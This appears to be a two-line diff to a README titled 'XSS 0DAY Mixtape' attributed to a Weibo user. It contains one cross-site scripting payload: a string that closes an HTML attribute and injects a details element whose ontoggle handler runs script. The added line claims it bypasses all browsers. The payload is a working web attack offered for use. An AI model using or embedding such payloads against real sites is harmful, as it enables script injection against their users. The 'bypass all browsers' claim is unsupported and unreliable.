@@ -1,2 +1,2 @@
 # XSS 0DAY Mixtape - weibo@flagellantX
-">'><details/open/ontoggle=confirm('flagellantX')>
+">'><details/open/ontoggle=confirm('flagellantX')> //Bypass All Browser Like Chrome,Firefox,Yandex,all...
